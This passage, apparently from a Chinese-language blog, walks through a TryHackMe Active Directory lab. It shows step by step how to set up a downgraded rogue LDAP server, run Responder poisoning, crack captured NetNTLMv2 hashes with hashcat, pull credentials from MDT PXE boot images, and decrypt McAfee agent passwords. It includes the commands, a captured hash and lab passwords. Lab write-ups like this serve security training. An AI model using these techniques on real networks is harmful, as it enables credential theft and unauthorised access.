<p>您可能需要多次尝试才能接收回连接，但它应该会在 5 秒内做出响应。 <code>supportedCapabilities</code> 响应告诉我们遇到了问题。本质上，在打印机发送凭据之前，它会尝试协商 LDAP 身份验证方法详细信息。它将使用此协商来选择打印机和 LDAP 服务器都支持的最安全的身份验证方法。如果身份验证方法太安全，则凭据将不会以明文形式传输。对于某些身份验证方法，凭据根本不会通过网络传输！所以我们不能只使用普通的 Netcat 来获取凭据。我们需要创建一个恶意 LDAP 服务器并对其进行不安全的配置，以确保凭证以明文形式发送。</p>
<h2 id="托管恶意-ldap-服务器">托管恶意 LDAP 服务器</h2>
<p>有多种方法可以托管恶意 LDAP 服务器，但我们将在本示例中使用 OpenLDAP。如果您使用 AttackBox，则已经为您安装了 OpenLDAP。但是，如果您使用自己的攻击机器，则需要使用以下命令安装 OpenLDAP：</p>
<pre><code class="hljs scss">apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd</code></pre>
<p>然而，您还必须在 攻击机 上配置您自己的恶意 LDAP 服务器。我们将首先使用以下命令重新配置 LDAP 服务器：</p>
<pre><code class="hljs scss">dpkg-reconfigure -<span class="hljs-selector-tag">p</span> low slapd</code></pre>
<p>如果您想跳过服务器配置，请确保在请求时按&lt;否&gt;，具体配置参考：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/breachingad">https://tryhackme.com/room/breachingad</a></p>
<p>在使用恶意 LDAP 服务器之前，我们需要通过降级支持的身份验证机制来使其容易受到攻击。我们希望确保我们的 LDAP 服务器仅支持 PLAIN 和 LOGIN 身份验证方法。为此，我们需要创建一个新的 ldif 文件，并使用以下内容进行调用：</p>
<p><strong>olcSaslSecProps.ldif</strong></p>
<pre><code class="hljs scss">dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=<span class="hljs-number">0</span>,passcred</code></pre>
<p>该文件具有以下属性：</p>
<ul>
<li>olcSaslSecProps：指定 SASL 安全属性</li>
<li>noanonymous：禁用支持匿名登录的机制</li>
<li>minssf：指定可接受的最小安全强度，0表示无保护。</li>
</ul>
<p>现在我们可以使用 ldif 文件来修补我们的 LDAP 服务器，方法如下：</p>
<pre><code class="hljs scss">ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart</code></pre>
<p>我们可以使用以下命令验证我们的恶意 LDAP 服务器的配置是否已应用（注意：如果您使用 Kali，您可能不会收到任何输出，但配置应该已生效，您可以继续执行后续步骤）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170327073.png" alt="image-20240209170327073"></p>
<h2 id="捕获-ldap-凭证">捕获 LDAP 凭证</h2>
<p>我们的恶意 LDAP 服务器现已配置完毕。当我们单击 <a target="_blank" rel="noopener" href="http://printer.za.tryhackme.com/settings.aspx">http://printer.za.tryhackme.com/settings.aspx</a> 上的“测试设置”时，身份验证将以明文形式进行。如果您正确配置了恶意 LDAP 服务器并且它正在降级通信，您将收到以下错误：“此专有名称包含无效语法”。如果收到此错误，您可以使用以下命令使用 tcpdump 来捕获凭据：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170441332.png" alt="image-20240209170441332"></p>
<pre><code class="hljs scss">tcpdump -SX -<span class="hljs-selector-tag">i</span> breachad tcp port <span class="hljs-number">389</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170526851.png" alt="image-20240209170526851"></p>
<p>另请注意， <code>password11</code> 是一个示例。您的服务密码将会不同。在 TCPdump 返回数据之前，您可能需要按几次“测试设置”按钮，因为我们是通过 VPN 连接执行攻击。</p>
<p>现在我们有了另一组有效的 AD 凭据！通过使用 LDAP 回传攻击并降级支持的身份验证机制，我们可以拦截明文形式的凭据。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209171228546.png" alt="image-20240209171228546"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209171236900.png" alt="image-20240209171236900"></p>
<h1 id="0x05-身份验证中继">0x05 身份验证中继</h1>
<p>继续讨论可以从我们的恶意设备发起的攻击，我们现在将研究针对更广泛的网络身份验证协议的攻击。在Windows网络中，有大量的服务相互通信，允许用户利用网络提供的服务。</p>
<p>这些服务必须使用内置的身份验证方法来验证传入连接的身份。在任务 2 中，我们探索了 Web 应用程序上使用的 NTLM 身份验证。在此任务中，我们将更深入地了解从网络角度来看此身份验证的情况。但是，对于此任务，我们将重点关注 SMB 使用的 NetNTLM 身份验证。</p>
<h2 id="服务器消息块">服务器消息块</h2>
<p>服务器消息块 (SMB) 协议允许客户端（如工作站）与服务器（如文件共享）进行通信。在使用 Microsoft AD 的网络中，SMB 负责管理从网络间文件共享到远程管理的所有事务。即使当您尝试打印文档时计算机收到的“缺纸”警报也是 SMB 协议的作用。</p>
<p>然而，早期版本的SMB协议安全性被认为是不足的。发现了几个漏洞和利用方式，可以利用它们来恢复凭据，甚至在设备上获得代码执行。尽管这些漏洞中的一些已在协议的更新版本中得到解决，但通常组织并不强制使用更新版本，因为旧系统不支持它们。我们将研究两种不同的利用方式，用于SMB的NetNTLM身份验证：</p>
<ul>
<li>由于NTLM Challenges可以被拦截，我们可以使用离线破解技术来恢复与NTLM Challenge相关的密码。然而，这种破解过程比直接破解 NTLM 哈希要慢得多。</li>
<li>我们可以使用我们的恶意设备进行中间人攻击，中继客户端和服务器之间的SMB身份验证，这将为我们提供一个活动的已验证会话和对目标服务器的访问。</li>
</ul>
<h2 id="llmnr-nbt-ns-and-wpad">LLMNR, NBT-NS, and WPAD</h2>
<p>在此任务中，我们将稍微了解一下使用 SMB 期间发生的身份验证。我们将使用 Responder 尝试拦截 NetNTLM 挑战来破解它。网络上通常有很多这样的挑战。一些安全解决方案甚至扫描整个 IP 范围以从主机恢复信息。有时，由于 DNS 记录过时，这些身份验证挑战最终可能会攻击您的恶意设备而不是目标主机。</p>
<p>Responder 允许我们通过在 NetNTLM 身份验证期间毒害响应来执行中间人攻击，欺骗客户端与您而不是他们想要连接的实际服务器进行对话。在真实 LAN 上，响应程序将尝试毒害检测到的任何链路本地多播名称解析 (LLMNR)、NetBIOS 名称服务 (NBT-NS) 和 Web 代理自动发现 (WPAD) 请求。在大型 Windows 网络上，这些协议允许主机为同一本地网络上的所有主机执行自己的本地 DNS 解析。主机可以首先尝试通过发送 LLMNR 请求并查看是否有主机响应来确定它们正在查找的主机是否位于同一本地网络上，而不是使 DNS 服务器等网络资源负担过重。 NBT-NS 是 LLMNR 的先驱协议，发出 WPAD 请求是为了尝试为未来的 HTTP(s) 连接找到代理。</p>
<p>由于这些协议依赖于在本地网络上广播的请求，因此我们的恶意设备也会收到这些请求。通常，这些请求会被简单地丢弃，因为它们不是针对我们的主机的。然而，响应者将主动侦听请求并发送有毒响应，告诉请求主机我们的 IP 与请求的主机名相关联。通过毒害这些请求，Responder 尝试强制客户端连接到我们的 AttackBox。在同一行中，它开始托管多个服务器，例如 SMB、HTTP、SQL 等，以捕获这些请求并强制进行身份验证。</p>
<h2 id="拦截-netntlm-挑战">拦截 NetNTLM 挑战</h2>
<p>需要注意的一件事是，Responder 实质上试图通过毒害连接来赢得竞争条件，以确保您拦截连接。这意味着响应程序通常仅限于本地网络上的中毒身份验证质询。由于我们通过 VPN 连接到网络，因此我们只能破坏该 VPN 网络上发生的身份验证质询。为此，我们模拟了一个可能中毒的身份验证请求，每 30 分钟运行一次。这意味着您可能需要等待一段时间才能拦截 NetNTLM 质询和响应。</p>
<p>尽管 Responder 在从连接到组织 LAN 的恶意设备执行时能够拦截和毒害更多身份验证请求，但了解这种行为可能具有破坏性并因此被检测到至关重要。通过中毒身份验证请求，正常的网络身份验证尝试将失败，这意味着用户和服务将无法连接到他们想要连接的主机和共享。在安全评估中使用 Responder 时请记住这一点。</p>
<p>Responder 已安装在 AttackBox 上。但是，如果您不使用 AttackBox，则可以从此存储库下载并安装它：<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder%E3%80%82%E6%88%91%E4%BB%AC%E5%B0%86%E8%AE%BE%E7%BD%AE">https://github.com/lgandx/Responder。我们将设置</a> Responder 在连接到 VPN 的接口上运行：</p>
<pre><code class="hljs scss">responder -<span class="hljs-selector-tag">I</span> breachad</code></pre>
<p>如果您使用 AttackBox，则并非所有响应程序服务都能够启动，因为其他服务已在使用这些端口。但是，这不会影响此任务。 Responder 现在将侦听任何传入的 LLMNR、NBT-NS 或 WPAD 请求。我们会让 Responder 在真实 LAN 上运行一段时间。然而，在我们的例子中，我们必须通过让其中一台服务器尝试对 VPN 上的计算机进行身份验证来模拟这种中毒。让 Responder 运行一段时间（平均 10 分钟，呼吸一下新鲜空气！），您应该会收到一个 SMBv2 连接，Responder 可以使用该连接来吸引和提取 NTLMv2-SSP 响应。它看起来像这样：</p>
<h2 id="ntlm-密码喷射攻击">NTLM 密码喷射攻击</h2>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[+]</span> Listening for events...
<span class="hljs-selector-attr">[SMBv2]</span> NTLMv2-SSP Client   : &lt;Client IP&gt;
[SMBv2] NTLMv2-SSP Username : ZA\&lt;Service Account Username&gt;
[SMBv2] NTLMv2-SSP Hash     : &lt;Service Account Username&gt;::ZA:&lt;NTLMv2-SSP Hash&gt;</code></pre>
<p>如果我们使用恶意设备，我们可能会运行 Responder 相当长的时间，捕获多个响应。一旦我们有了几个，我们就可以开始对响应执行一些离线破解，希望恢复它们关联的 NTLM 密码。如果账户配置了弱密码，我们就有很大的机会成功破解它们。将 NTLMv2-SSP 哈希复制到文本文件。然后，我们将使用可下载文件中提供的密码列表来执行此任务，并使用 Hashcat 尝试使用以下命令破解哈希：</p>
<pre><code class="hljs scss">hashcat -m <span class="hljs-number">5600</span> &lt;hash file&gt; &lt;password file&gt; <span class="hljs-attr">--force</span></code></pre>
<p>密码文件已在 AttackBox 的 <code>/root/Rooms/BreachingAD/task5/</code> 目录中或作为可下载的任务文件提供给您。我们使用 hashtype 5600，它与 hashcat 的 NTLMv2-SSP 相对应。如果您使用自己的机器，则必须先安装 Hashcat。</p>
<p>我们可以破解的任何哈希现在都将为我们提供用于违规的 AD 凭据！</p>
<h2 id="传递挑战">传递挑战</h2>
<p>然而，在某些情况下，我们可以更进一步，尝试传递挑战，而不是直接捕获挑战。如果事先不了解帐户，则执行此操作会有点困难，因为此攻击取决于关联帐户的权限。我们需要做一些对我们有利的事情：</p>
<ul>
<li>应禁用或启用 SMB 签名，但不强制执行。当我们执行中继时，我们会对请求进行微小的更改以将其传递。如果启用了 SMB 签名，我们将无法伪造消息签名，这意味着服务器会拒绝它。</li>
<li>关联的帐户需要服务器上的相关权限才能访问所请求的资源。理想情况下，我们希望中继具有服务器管理权限的帐户的质询和响应，因为这将使我们能够在主机上立足。</li>
<li>由于我们在技术上还没有 AD 立足点，因此需要对哪些帐户对哪些主机拥有权限进行一些猜测。如果我们已经违反了 AD，我们可以先执行一些初始枚举，这通常是这种情况。</li>
</ul>
<p>这就是盲接通常不流行的原因。理想情况下，您首先使用另一种方法破坏 AD，然后执行枚举以确定与您所破坏的帐户关联的权限。从这里，您通常可以执行横向移动以跨域进行权限升级。不过，从根本上了解一下中继攻击的工作原理还是很好的，如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png" alt="img"></p>
<p>如果您想实际尝试这种类型的攻击，请前往 Holo Network。我们也会在以后的广告室中再次讨论这一点。</p>
<p>首先执行responder：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175553243.png" alt="image-20240209175553243"></p>
<p>十分钟左右得到如下响应：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175607624.png" alt="image-20240209175607624"></p>
<pre><code class="hljs scss">svcFileCopy::ZA:b74c5cc6e5eaac51:E3C2C14AD0C8767E33B65AF91E87ABFE:<span class="hljs-number">0101000000000000803</span>D5A817F5BDA01051BE47B70F1B4730000000002000800380059005500440001001E00570049004E002D00340055005500560035004C0036004E0046003800300004003400570049004E002D00340055005500560035004C0036004E004600380030002E0038005900550044002E004C004F00430041004C000300140038005900550044002E004C004F00430041004C000500140038005900550044002E004C004F00430041004C0007000800803D5A817F5BDA0106000400020000000800300030000000000000000000000000200000B439D5FE6702315673E604C277083A3E0C091CE1C8C49BBD1E05AB2FCAA4BD990A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E0038002E00310030000000000000000000</code></pre>
<p>赋值其中的hash值到文件中，接着hashcat进行破解</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175641033.png" alt="image-20240209175641033"></p>
<p>一分钟左右得到结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175657254.png" alt="image-20240209175657254"></p>
<p>箭头处为密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175711468.png" alt="image-20240209175711468"></p>
<h1 id="0x06-microsoft-部署工具包">0x06 Microsoft 部署工具包</h1>
<p>大型组织需要工具来部署和管理资产的基础设施。在大型组织中，您无法让 IT 人员使用 DVD 甚至 USB 闪存驱动器在每台计算机上安装软件。幸运的是，微软已经提供了管理资产所需的工具。然而，我们也可以利用这些工具中的错误配置来破坏 AD。</p>
<h2 id="mdt-and-sccm">MDT and SCCM</h2>
<p>Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 (OS)。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中央位置维护和更新基础映像。</p>
<p>通常，MDT 与 Microsoft 的系统中心配置管理器 (SCCM) 集成，后者管理所有 Microsoft 应用程序、服务和操作系统的所有更新。 MDT 用于新部署。从本质上讲，它允许 IT 团队预配置和管理启动映像。因此，如果他们需要配置一台新机器，他们只需要插入网线，一切都会自动发生。他们可以对启动映像进行各种更改，例如已经安装 Office365 等默认软件和组织选择的防病毒软件。它还可以确保在安装第一次运行时更新新版本。</p>
<p>SCCM 几乎可以被视为 MDT 的扩展和老大哥。软件安装后会发生什么？嗯，SCCM 进行这种类型的补丁管理。它允许 IT 团队查看整个地产中安装的所有软件的可用更新。团队还可以在沙箱环境中测试这些补丁，以确保它们稳定，然后再将它们集中部署到所有加入域的计算机。它使 IT 团队的工作变得更加轻松。</p>
<p>然而，任何提供基础设施集中管理的东西（例如 MDT 和 SCCM）也可能成为攻击者的目标，试图接管该资产中的大部分关键功能。尽管可以通过多种方式配置 MDT，但对于此任务，我们将专门关注称为预启动执行环境 (PXE) 启动的配置。</p>
<h2 id="pxe-boot">PXE Boot</h2>
<p>大型组织使用 PXE 引导来允许连接到网络的新设备直接通过网络连接加载和安装操作系统。 MDT 可用于创建、管理和托管 PXE 启动映像。 PXE 启动通常与 DHCP 集成，这意味着如果 DHCP 分配 IP 租约，则允许主机请求 PXE 启动映像并启动网络操作系统安装过程。通信流程如下图所示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209180403270.png" alt="image-20240209180403270"></p>
<p>执行该过程后，客户端将使用 TFTP 连接下载 PXE 启动映像。我们可以将 PXE 启动映像用于两个不同的目的：</p>
<ul>
<li>注入权限升级向量（例如本地管理员帐户），以便在 PXE 启动完成后获得对操作系统的管理访问权限。</li>
<li>执行密码抓取攻击以恢复安装期间使用的 AD 凭据。</li>
</ul>
<p>在本任务中，我们将重点关注后者。我们将尝试在安装过程中恢复与 MDT 服务关联的部署服务帐户，以应对此密码抓取攻击。此外，还可以检索用于无人值守安装应用程序和服务的其他 AD 帐户。</p>
<h2 id="pxe-boot-image-retrieval">PXE Boot Image Retrieval</h2>
<p>由于 DHCP 有点挑剔，我们将绕过此攻击的初始步骤。我们将跳过尝试从 DHCP 请求 IP 和 PXE 启动预配置详细信息的部分。我们将手动执行该过程中此步骤的其余攻击。</p>
<p>您通过 DHCP 收到的有关 PXE 启动预配置的第一条信息是 MDT 服务器的 IP。在我们的例子中，您可以从 TryHackMe 网络图中恢复该信息。</p>
<p>您收到的第二条信息是 BCD 文件的名称。这些文件存储与不同类型的体系结构的 PXE 引导相关的信息。要检索此信息，您需要连接到此网站：<a target="_blank" rel="noopener" href="http://pxeboot.za.tryhackme.com">http://pxeboot.za.tryhackme.com</a>。它将列出各种 BCD 文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209180621620.png" alt="image-20240209180621620"></p>
<p>通常，您将使用 TFTP 请求每个 BCD 文件并枚举所有文件的配置。不过，由于时间关系，我们将重点关注 x64 架构的 BCD 文件。复制并存储该文件的全名。在本练习的其余部分中，我们将使用此名称占位符 <code>x64{7B...B3}.bcd</code> ，因为 MDT 每天都会重新生成文件及其名称。每次看到此占位符时，请记住将其替换为您的特定 BCD 文件名。另请注意，如果网络刚刚启动，这些文件名将仅在网络处于活动状态 10 分钟后更新。</p>
<p>现在从 DHCP 恢复了初始信息（眨眼），我们可以枚举并检索 PXE 启动映像。在接下来的几个步骤中，我们将使用 THMJMP1 上的 SSH 连接，因此请使用以下命令对此 SSH 会话进行身份验证：</p>
<pre><code class="hljs scss">ssh thm<span class="hljs-keyword">@THMJMP</span>1.za.tryhackme.com</code></pre>
<p>以及 <code>Password1@</code> 的密码。</p>
<p>为了确保网络的所有用户都可以使用 SSH，首先使用您的用户名创建一个文件夹，并将 powerpxe 存储库复制到此文件夹中：</p>
<pre><code class="hljs scss">C:\Users\THM&gt;cd Documents
C:\Users\THM\Documents&gt; mkdir hybcx
C:\Users\THM\Documents&gt; copy C:\powerpxe hybcx\
C:\Users\THM\Documents\&gt; cd hybcx</code></pre>
<p>我们需要执行的第一步是使用 TFTP 并下载 BCD 文件来读取 MDT 服务器的配置。 TFTP 比 FTP 有点棘手，因为我们无法列出文件。相反，我们发送文件请求，服务器将通过 UDP 连接回我们以传输文件。因此，我们在指定文件和文件路径时需要准确。 BCD 文件始终位于 MDT 服务器上的 /Tmp/ 目录中。我们可以在 SSH 会话中使用以下命令启动 TFTP 传输：</p>
<pre><code class="hljs scss">tftp -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.200</span><span class="hljs-selector-class">.9</span><span class="hljs-selector-class">.202</span> GET "\Tmp\x64{E212701C-<span class="hljs-number">9</span>A00-<span class="hljs-number">4</span>A53-<span class="hljs-number">866</span>C-F5DDD6C087D9}<span class="hljs-selector-class">.bcd</span>" conf<span class="hljs-selector-class">.bcd</span></code></pre>
<p>您必须使用 <code>nslookup thmmdt.za.tryhackme.com</code> 查找 THMMDT IP。现在 BCD 文件已恢复，我们将使用 powerpxe 读取其内容。 Powerpxe 是一个 PowerShell 脚本，可自动执行此类攻击，但通常会产生不同的结果，因此最好执行手动方法。我们将使用 powerpxe 的 Get-WimFile 函数从 BCD 文件中恢复 PXE 启动映像的位置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209182212001.png" alt="image-20240209182212001"></p>
<pre><code class="hljs scss">powershell -executionpolicy bypass</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209182254135.png" alt></p>
<p>WIM 文件是 Windows 映像格式 (WIM) 的可启动映像。现在我们已经知道了 PXE 启动映像的位置，我们可以再次使用 TFTP 下载该映像：</p>
<pre><code class="hljs scss">tftp -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.200</span><span class="hljs-selector-class">.9</span><span class="hljs-selector-class">.202</span> GET "\Boot\x64\Images\LiteTouchPE_x64<span class="hljs-selector-class">.wim</span>" pxeboot<span class="hljs-selector-class">.wim</span></code></pre>
<p>由于您正在下载完全可启动且已配置的 Windows 映像，因此此下载将需要一段时间。也许在等待的时候伸伸腿，喝杯水。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183036761.png" alt="image-20240209183036761"></p>
<h2 id="从-pxe-启动映像恢复凭证">从 PXE 启动映像恢复凭证</h2>
<p>现在我们已经恢复了 PXE 启动映像，我们可以窃取存储的凭据。应该指出的是，我们可以发起各种攻击。我们可以注入本地管理员用户，因此一旦映像启动，我们就具有管理员访问权限，我们可以安装映像以拥有加入域的计算机。如果您有兴趣了解有关这些攻击的更多信息，可以阅读本文。本次练习将重点关注尝试窃取凭据的简单攻击。</p>
<p>我们将再次使用 powerpxe 来恢复凭据，但您也可以通过提取映像并查找 bootstrap.ini 文件（通常存储这些类型的凭据）来手动执行此步骤。要使用 powerpxe 从引导文件恢复凭据，请运行以下命令：</p>
<pre><code class="hljs scss">Get-FindCredentials -WimFile pxeboot<span class="hljs-selector-class">.wim</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183140705.png" alt="image-20240209183140705"></p>
<p>如您所见，powerpxe 能够恢复 AD 凭据。我们现在有了另一组可以使用的 AD 凭据！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183850316.png" alt="image-20240209183850316"></p>
<h1 id="0x07-配置文件">0x07 配置文件</h1>
<p>我们将在此网络中探索的最后一个枚举途径是配置文件。假设您足够幸运，造成了一次漏洞，使您能够访问组织网络上的主机。在这种情况下，配置文件是尝试恢复 AD 凭据的绝佳探索途径。根据被破坏的主机，各种配置文件可能具有枚举价值：</p>
<ul>
<li>Web 应用程序配置文件</li>
<li>服务配置文件</li>
<li>Registry keys 注册表项</li>
<li>集中部署的应用程序</li>
</ul>
<p>可以使用多个枚举脚本（例如 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a>）来自动执行此过程。</p>
<h2 id="配置文件凭证">配置文件凭证</h2>
<p>但是，在此任务中，我们将重点关注从集中部署的应用程序恢复凭据。通常，这些应用程序需要一种在安装和执行阶段对域进行身份验证的方法。此类应用程序的一个示例是 McAfee Enterprise Endpoint Security，组织可以将其用作端点检测和安全响应工具。</p>
<p>McAfee 将安装期间用于连接回 Orchestrator 的凭据嵌入名为 ma.db 的文件中。可以通过对主机的本地访问来检索和读取该数据库文件，以恢复关联的 AD 服务帐户。在本练习中，我们将再次使用 THMJMP1 上的 SSH 访问。</p>
<p>ma.db 文件存储在固定位置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184228541.png" alt="image-20240209184228541"></p>
<p>我们可以使用 SCP 将 ma.db 复制到我们的 AttackBox：</p>
<pre><code class="hljs scss">scp thm<span class="hljs-keyword">@THMJMP</span>1.za.tryhackme.<span class="hljs-attribute">com</span>:<span class="hljs-attribute">C</span>:/ProgramData/McAfee/Agent/DB/ma.db .</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184454655.png" alt="image-20240209184454655"></p>
<p>为了读取数据库文件，我们将使用一个名为 sqlitebrowser 的工具。我们可以使用以下命令打开数据库：</p>
<pre><code class="hljs scss">sqlitebrowser ma<span class="hljs-selector-class">.db</span></code></pre>
<p>使用 sqlitebrowser，我们将选择“浏览数据”选项并关注 AGENT_REPOSITORIES 表：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184603539.png" alt="image-20240209184603539"></p>
<p>我们对第二个条目特别感兴趣，重点是 DOMAIN、AUTH_USER 和 AUTH_PASSWD 字段条目。记下这些条目中存储的值。但是，AUTH_PASSWD 字段已加密。幸运的是，McAfee 使用已知密钥加密该字段。因此，我们将使用以下旧的 python2 脚本来解密密码。该脚本已作为可下载的任务文件或在 AttackBox 上提供，可以在 <code>/root/Rooms/BreachingAD/task7/</code> 目录中找到。</p>
<p><strong>注意：我们在这里使用的工具已经很旧了。它使用 Python v2 并依赖于旧的加密库。如果您无法让脚本在您自己的虚拟机上运行，​​请使用 AttackBox。不过，该应用程序最近进行了更新，以确保它也可以在 Python3 上运行，您可以在此处下载最新版本：<a target="_blank" rel="noopener" href="https://github.com/funoverip/mcafee-sitelist-pwd-decryption">https://github.com/funoverip/mcafee-sitelist-pwd-decryption</a></strong></p>
<p>您必须解压缩 mcafee-sitelist-pwd-decryption.zip 文件，通过向脚本提供我们的 base64 编码和加密密码，该脚本将提供解密的密码：</p>
<pre><code class="hljs scss">python3 mcafee_sitelist_pwd_decrypt<span class="hljs-selector-class">.py</span> jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209185538219.png" alt="image-20240209185538219"></p>
<p>现在，我们再次拥有了一组 AD 凭据，可用于进一步枚举！这只是从配置文件恢复凭据的示例之一。如果您能够在主机上站稳脚跟，请务必遵循详细而完善的方法，以确保从主机恢复所有战利品，包括凭证和其他可以存储在配置文件中的敏感信息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209185831855.png" alt="image-20240209185831855"></p>
